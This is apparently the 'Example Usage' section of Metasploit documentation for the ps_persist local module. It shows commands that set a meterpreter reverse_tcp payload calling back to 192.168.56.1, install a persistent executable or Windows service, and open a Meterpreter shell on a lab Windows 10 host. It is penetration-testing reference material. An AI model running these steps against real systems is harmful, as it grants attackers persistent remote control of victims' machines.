
## Example Usage

```
msf exploit(handler) > use exploit/windows/local/ps_persist
msf exploit(ps_persist) > set session -1
session => -1
msf exploit(ps_persist) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ps_persist) > set lhost 192.168.56.1
lhost => 192.168.56.1
msf exploit(ps_persist) > set lport 4445
lport => 4445
msf exploit(ps_persist) > show options

Module options (exploit/windows/local/ps_persist):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   OUTPUT_TARGET                   no        Name and path of the generated executable, default random, omit extension
   SESSION        -1               yes       The session to run this module on.
   START_APP      true             no        Run EXE/Install Service
   SVC_DNAME      MsfDynSvc        no        Display Name to use for the Windows Service
   SVC_GEN        false            no        Build a Windows service, which defaults to running as localsystem
   SVC_NAME       MsfDynSvc        no        Name to use for the Windows Service


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal


msf exploit(ps_persist) > run

[*] Started reverse TCP handler on 192.168.56.1:4445
[+]  - Bytes remaining: 9664
[+]  - Bytes remaining: 1664
[+] Payload successfully staged.
[*] Sending stage (957999 bytes) to 192.168.56.101
[+] Finished!
[*] Meterpreter session 2 opened (192.168.56.1:4445 -> 192.168.56.101:49974) at 2016-10-08 18:42:36 -0500

meterpreter > sysinfo
Computer        : DESKTOP-B8ALP1P
OS              : Windows 10 (Build 14393).
Architecture    : x64 (Current Process is WOW64)
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
```

